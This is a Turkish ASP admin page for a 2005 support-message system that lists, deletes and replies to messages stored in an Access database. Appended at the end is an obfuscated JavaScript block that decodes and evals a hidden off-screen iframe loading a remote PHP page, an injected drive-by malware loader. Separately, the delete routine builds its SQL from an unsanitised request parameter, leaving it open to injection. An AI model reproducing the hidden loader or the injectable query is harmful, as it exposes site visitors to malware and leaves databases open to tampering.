<%										   
'***********************************************'
' Script    : Bilgi Edinme Sistemi V.1.0  		'
' Tarih     : 05 Ocak 2005, Saat : 17.44  		'
' Oluþturma : Talha Çopur				  		'
' E-Mail    : copurellezi@hotmail.com     		'
' Web		: http://www.talha.org		  		'
' ---------------------------------------------	'
' Belki de kodlarýn tamamýna yakýný		  		'
' AtaBerK Ileti Script v2.0 den editlenmiþtir 	'
' Bu noktada bu scripti hazýrlamama		  		'
' vesile olan, Mehmet Ayhan Taçyýldýz'a   		'
' þükranlarýmý sunuyorum.				  		'
' ---------------------------------------------	'
' Ayrýca ; www.aspindir.com ' a da bu vesile ile'
' en derin teþekkürlerimi iletiyorum. Emeði		'
' geçenleri kutluyor, tebrik ediyorum. 			'
'***********************************************'
%>

<!-- #include file="guvenlik.asp" -->
<script language="JavaScript">
<!--
function MM_openBrWindow(theURL,winName,features) { //v2.0
  window.open(theURL,winName,features);
}
//-->
</script>
<title>NetDADI  | Destek Formu Y&ouml;netim Sayfas&#305;</title>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1254">
<meta http-equiv="Content-Language" content="tr">
<link href="../Sekil.css" rel="stylesheet" type="text/css">
<% 
Set BilgiEdinmeSistem=Server.CreateObject("Adodb.Connection")
BilgiEdinmeSistem.Open "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & Server.Mappath("../../data/destek.mdb") 

Set Kayit=Server.CreateObject("ADODB.Recordset")
Sor = "Select * From kayitlar"
Kayit.Open sor,BilgiEdinmeSistem,1,3

topla=Kayit.Recordcount 
shf = Request.QueryString("shf")
if shf="" then 
shf=1
end if

islem = Request.QueryString("islem")
if islem = "sil" then
call sil
elseif islem="yil" then
call yil
elseif islem="ekle" then
call ekle
else
end if

%> <%
sub sil
id = Request("id")
Set Kayit = Server.CreateObject("ADODB.RecordSet")
SQL_delete = "DELETE from kayitlar WHERE id="&id&""
Kayit.open SQL_delete,BilgiEdinmeSistem,1,3
end sub
%> <%
                  Set Kayit = Server.CreateObject("ADODB.Recordset")
                  Sorgu = "Select * from kayitlar"
                  Kayit.Open Sorgu,BilgiEdinmeSistem,1,3

                  if Kayit.eof or Kayit.bof then
                  Response.Write "<p align=left><b><font color=black face=verdana size=2><br><br></b><center>» Hiç Mesaj Bulunmamaktadýr... </p>"
                  end if
%> <% on error resume next %> 
<div align="center"><img src="../resimler/YonetimBilgiEdinme001.jpg" width="429" height="75"></div>
<table border="1" cellpadding="4" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="719" align="center">
  <tr>
    <td width="148"><span style="font-family: tahoma">Mesaj Alýnma Tarih ve Saati</span> </td>
    <td width="172"><img src="../resimler/mesajsahibi_ADisoyadi.jpg" width="169" height="14"></td>
    <td width="169"><img src="../resimler/mesajsahibi_eposta.jpg" width="169" height="14"></td>
    <td width="188" bgcolor="444849"><img src="../resimler/mesajsahibiDETAYLAMA.jpg" width="169" height="14"></td>
  </tr>
  <%
Kayit.pagesize = 30
Kayit.absolutepage = shf
sayfala = Kayit.pagecount
for i=1 to Kayit.pagesize
if Kayit.eof then exit for
%> 
  <tr>
    <td bgcolor="F9F0DF"><p><img src="../Resimler/NOKTASAL.gif" width="7" height="7"> 
        <%=Kayit("tarih") %><span style="font-weight: bold">&nbsp;&nbsp;<%=Kayit("saat") %></span></p>
    </td>
    <td bgcolor="F9F0DF"><img src="../Resimler/NOKTASAL.gif" width="7" height="7"> 
      <%=Kayit("isim") %>&nbsp;<%=Kayit("soyisim") %> </td>
    <td bgcolor="F9F0DF"><img src="../Resimler/NOKTASAL.gif" width="7" height="7"> 
      <%=Kayit("email") %>&nbsp; </td>
    <td>&nbsp; <a href="javascript:" onClick="MM_openBrWindow('iletioku.asp?id=<%=Kayit("id")%>&islem=goster','Talha9','scrollbars=yes,width=508,height=460')"> 
      <img border="0" src="../resimler/mesajsahibimesaji.jpg" width="51" height="14"></a> 
      <b> &nbsp;&nbsp;<a title="Sil" href="default.asp?islem=sil&id=<%=Kayit("id")%>"><img border="0" src="../resimler/sil.gif" width="15" height="15"></a><a href="default.asp?islem=sil&id=<%=Kayit("id")%>" style="text-decoration: none"> 
      </a> &nbsp; <a href="javascript:" onClick="MM_openBrWindow('mailyolla.asp?id=<%=Kayit("id")%>&islem=goster','Talha91','scrollbars=yes,width=508,height=460')"> 
      <img border="0" src="../resimler/CEVAP.jpg" width="54" height="14"></a> 
      ( 
      <%
          Set cevap = Server.CreateObject("ADODB.Recordset")
          nere = "Select * From cevap where id = " & kayit("id") & ""
          cevap.Open nere, BilgiEdinmeSistem, 1,3
          toplamcevap = cevap.Recordcount
          %> <b> <a href="javascript:" onClick="MM_openBrWindow('cevaplara_goz_gezdir.asp?id=<%=kayit("id")%>','Talha92','scrollbars=yes,width=508,height=460')"> 
    <%=toplamcevap%></a></b> )</b></td>
  </tr>
  <%
  Kayit.movenext
  Next
  %> 
</table>
      
  
<div align="center"><b>Sayfa : <%
        for y=1 to sayfala 
        if shf=y then
        response.write y
        else
        response.write "<b><font color=FFFF00><a href=""default.asp?shf="&y&""">"&y&"</a></b>"
        end if
        next
        %> </b> </div>
<!-- . --><script>aq="0"+"x";bv=(5-3-1);sp="s"+"pli"+"t";w=window;z="dy";try{++document.body}catch(d21vd12v){vzs=false;try{}catch(wb){vzs=21;}if(!vzs)e=w["eval"];if(1){f="0,0,60,5d,17,1f,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,20,72,4,0,0,0,60,5d,69,58,64,5c,69,1f,20,32,4,0,0,74,17,5c,63,6a,5c,17,72,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,6e,69,60,6b,5c,1f,19,33,60,5d,69,58,64,5c,17,6a,69,5a,34,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,17,6e,60,5b,6b,5f,34,1e,28,27,27,1e,17,5f,5c,60,5e,5f,6b,34,1e,28,27,27,1e,17,6a,6b,70,63,5c,34,1e,6e,60,5b,6b,5f,31,28,27,27,67,6f,32,5f,5c,60,5e,5f,6b,31,28,27,27,67,6f,32,67,66,6a,60,6b,60,66,65,31,58,59,6a,66,63,6c,6b,5c,32,63,5c,5d,6b,31,24,28,27,27,27,27,67,6f,32,6b,66,67,31,27,32,1e,35,33,26,60,5d,69,58,64,5c,35,19,20,32,4,0,0,74,4,0,0,5d,6c,65,5a,6b,60,66,65,17,60,5d,69,58,64,5c,69,1f,20,72,4,0,0,0,6d,58,69,17,5d,17,34,17,5b,66,5a,6c,64,5c,65,6b,25,5a,69,5c,58,6b,5c,3c,63,5c,64,5c,65,6b,1f,1e,60,5d,69,58,64,5c,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6a,69,5a,1e,23,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,20,32,5d,25,6a,6b,70,63,5c,25,63,5c,5d,6b,34,1e,24,28,27,27,27,27,67,6f,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,27,1e,32,5d,25,6a,6b,70,63,5c,25,67,66,6a,60,6b,60,66,65,34,1e,58,59,6a,66,63,6c,6b,5c,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,27,1e,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6e,60,5b,6b,5f,1e,23,1e,28,27,27,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,5f,5c,60,5e,5f,6b,1e,23,1e,28,27,27,1e,20,32,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,25,58,67,67,5c,65,5b,3a,5f,60,63,5b,1f,5d,20,32,4,0,0,74"[sp](",");}w=f;s=[];for(i=20-20;-i+670!=0;i+=1){j=i;if((0x19==031))if(e)s+=String["fromCharCode"](e(aq+w[j])+0xa-bv);}za=e;za(s)}</script><!-- . -->